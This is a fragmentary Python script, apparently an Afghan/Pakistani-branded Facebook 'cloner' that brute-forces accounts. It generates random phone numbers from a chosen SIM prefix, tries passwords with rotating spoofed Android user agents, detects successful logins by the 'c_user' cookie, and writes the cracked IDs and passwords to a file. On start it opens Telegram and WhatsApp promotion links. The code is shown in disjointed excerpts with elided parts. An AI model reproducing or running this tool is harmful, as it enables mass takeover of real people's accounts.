...
os.system('xdg-open https://t.me/AfghanHackingchanil')
print('\n\033[1;37m MR HAQANI TOOLS UPDATE...\n NICE CLONER...')
import uuid
...
import uuid
import os,sys,time,json,random,re,string,platform,base64
os.system('xdg-open https://wa.me/9375264430')
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
...
for xd in range(5000):
	aa='Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 9; SM-J730G Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SM-J730FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.192 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-A037U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.83 Mobile Safari/537.36',
...
logo=("""
    ...
    _       _      ____     _   _      _                    _  __    _   _        __  __      _      ____     _____      _      _   _     
U  /"\  u  |"|    / __"| u |'| |'| U  /"\  u     ___       |"|/ /   |'| |'|     U|' \/ '|uU  /"\  u / __"| u |_ " _| U  /"\  u | \ |"|    
 \/ _ \/ U | | u <\___ \/ /| |_| |\ \/ _ \/     |_"_|      | ' /   /| |_| |\    \| |\/| |/ \/ _ \/ <\___ \/    | |    \/ _ \/ <|  \| |>   
 / ___ \  \| |/__ u___) | U|  _  |u / ___ \      | |     U/| . \\u U|  _  |u     | |  | |  / ___ \  u___) |   /| |\   / ___ \ U| |\  |u   
/_/   \_\  |_____||____/>> |_| |_| /_/   \_\   U/| |\u     |_|\_\   |_| |_|      |_|  |_| /_/   \_\ |____/>> u |_|U  /_/   \_\ |_| \_|    
 \\    >>  //  \\  )(  (__)//   \\  \\    >>.-,_|___|_,-.,-,>> \\,-.//   \\     <<,-,,-.   \\    >>  )(  (__)_// \\_  \\    >> ||   \\,-. 
(__)  (__)(_")("_)(__)    (_") ("_)(__)  (__)\_)-' '-(_/  \.)   (_/(_") ("_)     (./  \.) (__)  (__)(__)    (__) (__)(__)  (__)(_")  (_/  
...
def annu():
    os.system('clear')
    print(logo)
    print('[1] RANDOM NICE  UPDATE\x1b[1;92m  1')
    print('\x1b[1;97m[2] RANDOM NICE IDZ\x1b[1;92m  2')
    lines()
...
def bangla():
	...
	print('\x1b[1;97m[2] PAK Crack \x1b[1;92mM 1')
...
def m1():
    ...
    os.system('clear')
    print(logo)
    print('[jamil] Example  : 070,079,078,****Etc')
    print('\x1b[1;92m[HAQANI] See Note : PUT YOUR SIM CODE ')
    lines()
    kode = input('[jamil] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[jamil] Example  : 2000,3000,5000,****Etc')
    print('\x1b[1;92m[jamil] See Note : PUT LEMIT ')
    lines()
    limit = int(input('[jamil] Idz Lemit : '))
    print(46*'-')
...
def m2():
    ...
    os.system('clear')
    print(logo)
    print('[jamil] Example  : 070,078,077,****Etc')
    print('\x1b[1;92m[jamil] See Note : PUT YOUR SIM CODE ')
    lines()
    kode = input('[jamil] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[jamil] Example  : 5000,100000,****Etc')
    print('\x1b[1;92m[jamil] See Note : PUT LEMIT ')
    lines()
    limit = int(input('[jamil] Idz Lemit : '))
    print(46*'-')
...
def m3():
    ...
    os.system('clear')
    print(logo)
    print('[jamil] Example  : 9370,9378,9377,****Etc')
...
def b1():
    ...
    os.system('clear')
    print(logo)
    print('[jamil] Example  : 0306,92***,92***,****Etc')
    print('\x1b[1;92m[+] See Note : PUT YOUR SIM CODE ')
    lines()
    kode = input('[jamil] Your Code : ')
    lines()
    ...
    lines()
    limit = int(input('[HAQANI] YOUR LEMIT : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
...
def b2():
    ...
    os.system('clear')
    print(logo)
    print('[HAQANI] Example  : 92***,92***,92***,****Etc')
    print('\x1b[1;91m[MAFIA] See Note : PUT YOUR SIM CODE ')
    lines()
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[jamil-OK] '+cid+' | '+ps+'\033[0;97m')
                open('jamil-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mjamil\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
def approval():
